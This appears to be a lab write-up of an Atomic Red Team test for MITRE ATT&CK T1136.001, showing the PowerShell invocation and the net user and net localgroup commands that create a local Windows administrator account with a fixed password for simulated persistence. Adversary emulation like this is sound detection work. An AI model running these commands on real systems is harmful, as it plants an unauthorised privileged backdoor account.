## MITRE ATT&CK Technique

**T1136.001 – Create Account: Local Account**

---

## Atomic Red Team Test

**T1136.001-8 – Create a New Windows Administrator Account**

---

## Command Executed

```powershell
Invoke-AtomicTest T1136.001 -TestNumbers 8 -Path "C:\Users\azureuser\Desktop\AtomicRedTeam\atomics"
```

---

## Atomic Test Execution

The Atomic Red Team simulation successfully executed the following commands:

```cmd
net user /add "T1136.001_Admin" "T1136_pass"

net localgroup administrators "T1136.001_Admin" /add
```

---

## Result

A new local administrator account named **T1136.001_Admin** was successfully created on the Windows endpoint and added to the local **Administrators** group.

This simulated an attacker establishing a privileged local account to maintain persistent access to the compromised system.
